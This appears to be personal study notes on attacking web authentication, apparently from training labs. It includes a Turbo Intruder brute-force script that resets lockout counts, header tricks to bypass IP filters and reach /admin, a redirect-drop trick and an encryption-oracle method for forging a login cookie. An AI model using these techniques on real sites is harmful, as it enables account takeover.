[#](#) Authentication

Bypass IP Filtering:

    X-Forwarded-For: foo
    
    Reset lock counts upon successful?

    ```
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )

        for word in open('C:\Users\srbx7\Desktop\lists\password.txt'):
            engine.queue(target.req, ["wiener","peter"])
            engine.queue(target.req, ["carlos",word.rstrip()])


    def handleResponse(req, interesting):
        # currently available attributes are req.status, req.wordcount, req.length and req.response
        if req.status == 302:
            table.add(req)
    ```
Time based enumeration (add long password ;) )

Can't bypass IP Filtering?

    Is there an admin interface /admin
    
       Host: localhost
       
       TRACE /admin # And find Custom header
       X-Custom-Ip-Authorization: 127.0.0.1
       
    Fuzz no matter what, and grep negative for error?

Change Password:

    - POST Change Username?
    - POST username=wiener&current=peter&new_1=AAAA&new_2=BBBB
        - > New Passwords do not match > Bruteforce

Drop request:

    - Is there a unusual request that you can simply drop (instead of changing params) to not receive the new state (set-cookie)
        - POST /login -> GET /role-selector (DROP)

Stay-logged-in: 

    - Can you decode the cookie
    - Can you decrypt the cookie:
        - Encryption Oracle -> POST /foo -> Set-Cookie: Notification=ENCRYPTED -> <html><header>My Super Notification: controlled_user_data</header><body>...
            - Can you put the stay-logged-in cookie instead of controlled_user_data
            - Create Encrypt / Decrypt Tabs
            - Need to remove prefix
            - Encrypted Data -> Decoder -> URL Decode -> Base64 -> Delete Bytes len("prefix")
            - 16-bytes blocks error? -> how much to add so that we can safely remove the first block? -> 
            ```
            # When sending to encrypt, the backend add "prefix" and then encrypt....
            ## prefixXXXXXXXXXX
            block_1 = "X" * (16 - len("prefix")) # "prefix" will be automatically added
            block_2 = "administrator:timestamp"
            encrypt = block_1 + block_2```
            # Encrypt and then remove first 16-bytes (hex in decoder and encode back)
            print(encrypt)
